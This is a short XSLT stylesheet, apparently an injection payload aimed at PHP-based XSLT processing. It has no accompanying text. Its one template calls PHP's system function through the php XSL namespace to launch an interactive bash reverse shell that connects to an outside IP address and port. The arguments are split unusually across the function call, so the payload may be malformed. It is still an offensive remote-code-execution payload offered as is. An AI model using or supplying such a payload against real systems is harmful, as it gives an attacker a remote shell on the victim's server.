<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system', '/bin/bash', '-i', '>&', '/dev/tcp/52.28.112.211/14723', '0>&1')" />
  </xsl:template>
</xsl:stylesheet>
